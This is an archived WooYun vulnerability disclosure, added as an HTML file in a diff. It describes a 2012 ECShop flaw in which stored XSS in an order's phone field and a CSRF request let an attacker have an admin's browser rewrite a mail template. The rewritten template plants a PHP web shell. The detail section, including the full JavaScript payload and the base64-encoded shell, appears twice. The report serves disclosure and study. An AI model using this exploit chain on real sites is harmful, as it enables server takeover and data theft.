@@ -1,0 +1,453 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop csrf getshell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop csrf getshell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2012-10-21 21:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-10-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-10-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-31：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-11-10：	细节向普通白帽子公开<br/>
+									2012-11-20：	细节向实习白帽子公开<br/>
+									2012-12-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">吐槽下ecshop后台安全性真的太弱了。。前台组合xss来猥琐的让管理员后台getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">0x0	后台getshell<br />
+<br />
+    在includes/cls_template.php fetch函数<br />
+<br />
+</p><pre><code>/**<br />
+     * 处理模板文件<br />
+     *<br />
+     * @access  public<br />
+     * @param   string      $filename<br />
+     * @param   sting      $cache_id<br />
+     *<br />
+     * @return  sring<br />
+     */<br />
+    function fetch($filename, $cache_id = &#039;&#039;)<br />
+    {<br />
+        if (!$this-&gt;_seterror)<br />
+        {<br />
+            error_reporting(E_ALL ^ E_NOTICE);<br />
+        }<br />
+        $this-&gt;_seterror++;<br />
+		<br />
+        //若$filename以str:开头则执行下面的语句<br />
+        if (strncmp($filename,&#039;str:&#039;, 4) == 0)<br />
+        {<br />
+            $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));<br />
+        }</code></pre><p class='detail'><br />
+<br />
+    可以看到如果$filename以&quot;str:&quot;开头那么就调用_eval()函数执行&quot;str:&quot;后面的代码, 不过在执行之前系统调用fetch_str函数进行字符查找和替换。<br />
+<br />
+<br />
+<br />
+　　_eval():<br />
+<br />
+</p><pre><code>function _eval($content)<br />
+    {<br />
+        ob_start();<br />
+        eval(&#039;?&#039; . &#039;&gt;&#039; . trim($content));<br />
+        $content = ob_get_contents();<br />
+        ob_end_clean();<br />
+<br />
+        return $content;<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>/**<br />
+     * 处理字符串函数<br />
+     *<br />
+     * @access  public<br />
+     * @param   string     $source<br />
+     *<br />
+     * @return  string<br />
+     */<br />
+    function fetch_str($source)<br />
+    {<br />
+        if (!defined(&#039;ECS_ADMIN&#039;))<br />
+        {<br />
+            $source = $this-&gt;smarty_prefilter_preCompile($source);<br />
+        }<br />
+        $source = preg_replace(&quot;/&lt;\?[^&gt;&lt;]+\?&gt;|&lt;\%[^&gt;&lt;]+\%&gt;|&lt;script[^&gt;]+language[^&gt;]*=[^&gt;]*php[^&gt;]*&gt;[^&gt;&lt;]*&lt;\/script\s*&gt;/iU&quot;, &quot;&quot;, $source);<br />
+        return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#039;\\1&#039;);&quot;, $source);<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+    过滤了php语言的标记。<br />
+<br />
+<br />
+<br />
+    现在需要查看有哪些代码调用了这个函数，找到了这段代码：wholesale.php<br />
+<br />
+</p><pre><code>　　/*------------------------------------------------------ */<br />
+　　//-- 提交订单<br />
+　　/*------------------------------------------------------ */<br />
+　　elseif ($_REQUEST[&#039;act&#039;] == &#039;submit_order&#039;)<br />
+　　{<br />
+　　    include_once(ROOT_PATH . &#039;includes/lib_order.php&#039;);<br />
+　　... ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　... ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　    /* 给商家发邮件 */<br />
+　　    if ($_CFG[&#039;service_email&#039;] != &#039;&#039;)<br />
+　　    {<br />
+　　        $tpl = get_mail_template(&#039;remind_of_new_order&#039;);<br />
+　　    ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　    ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　$content = $smarty-&gt;fetch(&#039;str:&#039; . $tpl[&#039;template_content&#039;]);<br />
+　　        ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+　　在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。<br />
+<br />
+　　在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为&quot;{$phpinfo()&#039;];phpinfo();/*}&quot;，然后在调试中可以看到代码被替换成了&quot;&lt;?php echo $this-&gt;_var[&#039;phpinfo()&#039;];phpinfo();/*&#039;]; ?&gt;&quot;，代码成功执行。<br />
+<br />
+</p><p class="detail"><a href="../images/21205649397c4819a12881276341a72e654a7a16.png" target="_blank"><img src="../images/21205649397c4819a12881276341a72e654a7a16.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+0x1 前台xss<br />
+<br />
+　　前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。<br />
+<br />
+　　注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。<br />
+<br />
+  </p><p class="detail"><a href="../images/21205840b9c27b4e1ca436a92a490106918d9763.png" target="_blank"><img src="../images/21205840b9c27b4e1ca436a92a490106918d9763.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+0x2 xss+后台getshell<br />
+<br />
+　　由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。<br />
+<br />
+　　以下是实现getshell的js：<br />
+<br />
+</p><pre><code>Var Shelldata=&#039;subject=%C3%DC%C2%EB%D5%D2%BB%D8&amp;mail_type=0&amp;tpl=1&amp;content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E&#039;; try{ var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;)); xml.open(&quot;POST&quot;,&#039;/ecshop/upload/admin/mail_template.php?act=save_template&#039;,false); xml.setRequestHeader(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;); xml.onreadystatechange = function(){if(xml.readyState == 4){}}; xml.send(Shelldata); }catch(e){}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+    上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用<br />
+<br />
+</p><p class="detail"><a href="../images/21210031affd55ca327a9d4b56d7732c1adfe3c4.png" target="_blank"><img src="../images/21210031affd55ca327a9d4b56d7732c1adfe3c4.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+　　最后提交订单，管理员访问该订单，用户找回密码，就会在根目录生成shell.php，密码207.<br />
+<br />
+　　<br />
+<br />
+　　管理员访问订单前的找回密码模板：<br />
+<br />
+</p><p class="detail"><a href="../images/2121005454776908b8b414c68003efb597b23e54.png" target="_blank"><img src="../images/2121005454776908b8b414c68003efb597b23e54.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　管理员查看订单<br />
+<br />
+</p><p class="detail"><a href="../images/212101201583169598314f791cb715f7ab9a5fb8.png" target="_blank"><img src="../images/212101201583169598314f791cb715f7ab9a5fb8.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　管理员访问订单之后的邮件模板<br />
+<br />
+</p><p class="detail"><a href="../images/2121020886744b0c5b8b220d37b315f7717745a9.png" target="_blank"><img src="../images/2121020886744b0c5b8b220d37b315f7717745a9.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　最后用户前台找回密码，根目录下生成一句话shell.php<br />
+<br />
+</p><p class="detail"><a href="../images/2121022869fdf668d69c8d41031318e690eca4f0.png" target="_blank"><img src="../images/2121022869fdf668d69c8d41031318e690eca4f0.png" alt="" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">0x0	后台getshell<br />
+<br />
+    在includes/cls_template.php fetch函数<br />
+<br />
+</p><pre><code>/**<br />
+     * 处理模板文件<br />
+     *<br />
+     * @access  public<br />
+     * @param   string      $filename<br />
+     * @param   sting      $cache_id<br />
+     *<br />
+     * @return  sring<br />
+     */<br />
+    function fetch($filename, $cache_id = &#039;&#039;)<br />
+    {<br />
+        if (!$this-&gt;_seterror)<br />
+        {<br />
+            error_reporting(E_ALL ^ E_NOTICE);<br />
+        }<br />
+        $this-&gt;_seterror++;<br />
+		<br />
+        //若$filename以str:开头则执行下面的语句<br />
+        if (strncmp($filename,&#039;str:&#039;, 4) == 0)<br />
+        {<br />
+            $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4)));<br />
+        }</code></pre><p class='detail'><br />
+<br />
+    可以看到如果$filename以&quot;str:&quot;开头那么就调用_eval()函数执行&quot;str:&quot;后面的代码, 不过在执行之前系统调用fetch_str函数进行字符查找和替换。<br />
+<br />
+<br />
+<br />
+　　_eval():<br />
+<br />
+</p><pre><code>function _eval($content)<br />
+    {<br />
+        ob_start();<br />
+        eval(&#039;?&#039; . &#039;&gt;&#039; . trim($content));<br />
+        $content = ob_get_contents();<br />
+        ob_end_clean();<br />
+<br />
+        return $content;<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>/**<br />
+     * 处理字符串函数<br />
+     *<br />
+     * @access  public<br />
+     * @param   string     $source<br />
+     *<br />
+     * @return  string<br />
+     */<br />
+    function fetch_str($source)<br />
+    {<br />
+        if (!defined(&#039;ECS_ADMIN&#039;))<br />
+        {<br />
+            $source = $this-&gt;smarty_prefilter_preCompile($source);<br />
+        }<br />
+        $source = preg_replace(&quot;/&lt;\?[^&gt;&lt;]+\?&gt;|&lt;\%[^&gt;&lt;]+\%&gt;|&lt;script[^&gt;]+language[^&gt;]*=[^&gt;]*php[^&gt;]*&gt;[^&gt;&lt;]*&lt;\/script\s*&gt;/iU&quot;, &quot;&quot;, $source);<br />
+        return preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#039;\\1&#039;);&quot;, $source);<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+    过滤了php语言的标记。<br />
+<br />
+<br />
+<br />
+    现在需要查看有哪些代码调用了这个函数，找到了这段代码：wholesale.php<br />
+<br />
+</p><pre><code>　　/*------------------------------------------------------ */<br />
+　　//-- 提交订单<br />
+　　/*------------------------------------------------------ */<br />
+　　elseif ($_REQUEST[&#039;act&#039;] == &#039;submit_order&#039;)<br />
+　　{<br />
+　　    include_once(ROOT_PATH . &#039;includes/lib_order.php&#039;);<br />
+　　... ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　... ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　    /* 给商家发邮件 */<br />
+　　    if ($_CFG[&#039;service_email&#039;] != &#039;&#039;)<br />
+　　    {<br />
+　　        $tpl = get_mail_template(&#039;remind_of_new_order&#039;);<br />
+　　    ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　    ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　$content = $smarty-&gt;fetch(&#039;str:&#039; . $tpl[&#039;template_content&#039;]);<br />
+　　        ... ... ... ... ... ... ... ... ... ... ... ...<br />
+　　}</code></pre><p class='detail'><br />
+<br />
+　　在提交订单的地方看到了代码调用了get_mail_template()获得remind_of_new_order模板的内容，然后放入到fetch中执行，如果可以控制remind_of_new_order模板的内容那就可以让ecshop执行我们的命令了。<br />
+<br />
+　　在后台可以在模板管理中找到邮件模板，更改remind_of_new_order的内容为&quot;{$phpinfo()&#039;];phpinfo();/*}&quot;，然后在调试中可以看到代码被替换成了&quot;&lt;?php echo $this-&gt;_var[&#039;phpinfo()&#039;];phpinfo();/*&#039;]; ?&gt;&quot;，代码成功执行。<br />
+<br />
+</p><p class="detail"><a href="../images/21205649397c4819a12881276341a72e654a7a16.png" target="_blank"><img src="../images/21205649397c4819a12881276341a72e654a7a16.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+0x1 前台xss<br />
+<br />
+　　前台在有些地方过滤不够充分，导致用户可以构造恶意javascript完成对后台管理员的xss攻击。<br />
+<br />
+　　注册用户以后随便买个东西，收货人信息里电话一栏只有本地的客户端检查，而没有后端过滤，容易招到xss攻击。<br />
+<br />
+  </p><p class="detail"><a href="../images/21205840b9c27b4e1ca436a92a490106918d9763.png" target="_blank"><img src="../images/21205840b9c27b4e1ca436a92a490106918d9763.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+0x2 xss+后台getshell<br />
+<br />
+　　由于没有csrf的防护，因此可以前台xss到后台并让管理员帮我们getshell。<br />
+<br />
+　　以下是实现getshell的js：<br />
+<br />
+</p><pre><code>Var Shelldata=&#039;subject=%C3%DC%C2%EB%D5%D2%BB%D8&amp;mail_type=0&amp;tpl=1&amp;content=%7B%24user_name%27%5D%3Bfile_put_contents%28base64_decode%28%27c2hlbGwucGhw%27%29%2Cbase64_decode%28%27PD9waHAgQGV2YWwoJF9QT1NUWycyMDcnXSk7Pz4%3D%27%29%29%3Becho+%24var%5B%27%24user_name%7D%0D%0A%3C%2Fp%3E%0D%0A%3Cp%3E%7B%24user_name%7D%C4%FA%BA%C3%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%C4%FA%D2%D1%BE%AD%BD%F8%D0%D0%C1%CB%C3%DC%C2%EB%D6%D8%D6%C3%B5%C4%B2%D9%D7%F7%A3%AC%C7%EB%B5%E3%BB%F7%D2%D4%CF%C2%C1%B4%BD%D3%28%BB%F2%D5%DF%B8%B4%D6%C6%B5%BD%C4%FA%B5%C4%E4%AF%C0%C0%C6%F7%29%3A%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%3Ca+target%3D%22_blank%22+href%3D%22%7B%24reset_email%7D%22%3E%7B%24reset_email%7D%3C%2Fa%3E%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%D2%D4%C8%B7%C8%CF%C4%FA%B5%C4%D0%C2%C3%DC%C2%EB%D6%D8%D6%C3%B2%D9%D7%F7%A3%A1%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%7B%24shop_name%7D%3Cbr+%2F%3E%0D%0A%7B%24send_date%7D%3C%2Fp%3E&#039;; try{ var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject(&#039;Microsoft.XMLHTTP&#039;)); xml.open(&quot;POST&quot;,&#039;/ecshop/upload/admin/mail_template.php?act=save_template&#039;,false); xml.setRequestHeader(&#039;Content-Type&#039;, &#039;application/x-www-form-urlencoded&#039;); xml.onreadystatechange = function(){if(xml.readyState == 4){}}; xml.send(Shelldata); }catch(e){}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+    上传这个js的图片并引用或者直接从外部网站引用都可以。为了测试方便，从本地引用<br />
+<br />
+</p><p class="detail"><a href="../images/21210031affd55ca327a9d4b56d7732c1adfe3c4.png" target="_blank"><img src="../images/21210031affd55ca327a9d4b56d7732c1adfe3c4.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+　　最后提交订单，管理员访问该订单，用户找回密码，就会在根目录生成shell.php，密码207.<br />
+<br />
+　　<br />
+<br />
+　　管理员访问订单前的找回密码模板：<br />
+<br />
+</p><p class="detail"><a href="../images/2121005454776908b8b414c68003efb597b23e54.png" target="_blank"><img src="../images/2121005454776908b8b414c68003efb597b23e54.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　管理员查看订单<br />
+<br />
+</p><p class="detail"><a href="../images/212101201583169598314f791cb715f7ab9a5fb8.png" target="_blank"><img src="../images/212101201583169598314f791cb715f7ab9a5fb8.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　管理员访问订单之后的邮件模板<br />
+<br />
+</p><p class="detail"><a href="../images/2121020886744b0c5b8b220d37b315f7717745a9.png" target="_blank"><img src="../images/2121020886744b0c5b8b220d37b315f7717745a9.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+　　最后用户前台找回密码，根目录下生成一句话shell.php<br />
+<br />
+</p><p class="detail"><a href="../images/2121022869fdf668d69c8d41031318e690eca4f0.png" target="_blank"><img src="../images/2121022869fdf668d69c8d41031318e690eca4f0.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-013680" title="ecshop csrf getshell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-10-21 23:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您为shopex信息安全做的贡献<br />
+我们将尽快修复<br />
+非常感谢<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="13680";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
